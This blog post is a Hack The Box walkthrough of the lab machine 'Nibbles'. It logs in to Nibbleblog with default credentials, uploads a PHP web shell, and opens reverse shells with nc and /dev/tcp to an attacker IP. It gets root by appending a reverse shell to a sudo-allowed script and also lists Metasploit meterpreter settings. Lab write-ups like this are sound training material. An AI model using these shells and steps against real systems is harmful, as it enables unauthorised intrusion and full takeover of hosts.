---
layout: post
title: "Nibbles – Hack The Box"
categories: htb
date: 2025-07-12
---

## 🧠 Summary

Hack The Box's *Nibbles* is an easy Linux box focused on **web enumeration**, **file upload exploitation**, and **privilege escalation** via **sudo misconfiguration**. We exploit a vulnerable web app to get a reverse shell, then escalate to root through a script that can be executed with sudo.

## 🔍 Tools Used

- Nmap  
- Gobuster  
- Curl  
- Netcat  
- LinEnum  
- Python (TTY upgrade)  
- Metasploit (optional method)

## 🖼️ Screenshots Used

1. Nmap scan result  
2. Gobuster output  
3. Upload directory (monitor.sh)  
4. Successful reverse shell (listener)  
5. LinEnum findings  
6. Root shell  
7. Flags (user.txt & root.txt)

---

## 🛰️ 1. Nmap Scan

```bash
nmap -sC -sV -oN nibbles_nmap.txt 10.10.10.75
```
Result:
22/tcp: OpenSSH
80/tcp: Apache
Web title: Nibbles
📸 Add Screenshot 1: Nmap scan result

## 🌐 2. Web Enumeration
🔍 Gobuster Directory Scan
```bash
gobuster dir -u [http://10.10.10.75](http://10.10.10.75) -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 40
```
Interesting Results:
```bash
/nibbleblog/
/nibbleblog/admin.php
```
📸 Add Screenshot 2: Gobuster results showing /nibbleblog/

##🔑 3. CMS Login
Try default credentials:

```Plaintext
Username: admin
Password: nibbles
Login at: http://10.10.10.75/nibbleblog/admin.php
```
📸 Add Screenshot 3: Admin dashboard of Nibbleblog

##💉 4. Upload Reverse Shell
Go to: Settings → My Blog → Plugins → My Image
Upload a PHP reverse shell (disguised as image and renamed in intercept).

Example shell (if allowed):

```PHP
<?php system($_GET['cmd']); ?>
```
Or create a shell like this:
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <your-ip> 4444 > /tmp/f
```
Start a listener on a different terminal:
```bash
nc -lvnp 4444
```
Then trigger the uploaded shell in the browser or through command injection.
📸 Add Screenshot 4: Shell callback / Listener active

##⚙️ 5. Shell to TTY
Stabilize the shell:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

##🧪 6. Enumeration
Upload and run LinEnum:
```bash
upload LinEnum.sh /tmp/LinEnum.sh
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh
```
📸 Add Screenshot 5: LinEnum output showing sudo access

##🔓 7. Privilege Escalation
From LinEnum output:
```bash
User nibbler may run the following command:
  (ALL : ALL) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Append a reverse shell command to monitor.sh or modify it:
```bash
echo 'bash -i >& /dev/tcp/<your-ip>/4445 0>&1' >> /home/nibbler/personal/stuff/monitor.sh
```
Then:
```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```
📸 Add Screenshot 6: Root shell with id

##🚩 8. Flags
👤 User Flag:
```bash
cat /home/nibbler/user.txt
```
👑 Root Flag:
```bash
cat /root/root.txt
```
📸 Add Screenshot 7: Both flags

##⚙️ Optional Method: Using Metasploit
This box has a Metasploit module available.
🔍 Search and Use
```bash
msfconsole
search nibbleblog
use exploit/multi/http/nibbleblog_file_upload
```
🔧 Set Options
```bash
set RHOSTS 10.10.10.75
set TARGETURI /nibbleblog
set USERNAME admin
set PASSWORD nibbles
set LHOST <your-ip>
set LPORT 4444
set PAYLOAD php/meterpreter/reverse_tcp
exploit
```
This automates the shell upload and trigger steps.
Once meterpreter opens:
```bash
getuid
sysinfo
```
Continue steps to gain flags...

✅ Summary
| Step                | Technique                                |
|---------------------|------------------------------------------|
| Initial Foothold    | Web enum → Upload PHP shell in Nibbleblog |
| Credentials         | Default: admin:nibbles                   |
| Reverse Shell       | Netcat listener + bash shell             |
| Privilege Escalation| Sudo on monitor.sh script                |
| Root Access         | Reverse shell command in script          |
| Metasploit Option   | `nibbleblog_file_upload` module          |

